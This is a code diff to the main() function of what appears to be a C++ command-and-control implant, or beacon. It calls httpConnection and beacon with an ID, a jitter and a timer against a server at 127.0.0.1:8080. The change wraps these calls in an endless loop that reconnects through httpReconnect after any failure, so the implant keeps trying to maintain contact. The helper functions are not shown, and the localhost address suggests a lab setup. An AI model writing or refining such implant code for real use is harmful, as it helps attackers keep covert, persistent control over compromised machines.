@@ -15,16 +15,35 @@
 
 
 int main() {
-    try {
-        auto result = httpConnection("127.0.0.1");
-        int Timer = std::get<0>(result);
-        std::string ID = std::get<1>(result);
-        int Jitter = std::get<2>(result);
-        beacon("127.0.0.1:8080", ID, Jitter, Timer);
+    std::string ID = "";
+    int Jitter = -1;
+    int Timer = -1;
+    while (true) {
+        try {
+            if (ID != "" && Jitter != -1 && Timer != -1) {
+                auto result = httpReconnect("127.0.0.1", ID, Jitter, Timer);
+                if (std::get<0>(result) == -1) {
+                    continue;
+                }
+            } else {
+                auto result = httpConnection("127.0.0.1");
+                if (std::get<0>(result) == -1) {
+                    continue;
+                }
+                Timer = std::get<0>(result);
+                ID = std::get<1>(result);
+                Jitter = std::get<2>(result);
+            }
+            int err = beacon("127.0.0.1:8080", ID, Jitter, Timer);
+            if (err == -1) {
+                continue;
+            }
 
-    } catch (const std::exception& e) {
-        std::cerr << "Failed to establish HTTP connection: " << e.what() << std::endl;
-        return 1;
+
+        } catch (const std::exception& e) {
+            std::cerr << "Failed to establish HTTP connection: " << e.what() << std::endl;
+            return 1;
+        }
     }
     return 0;
 }
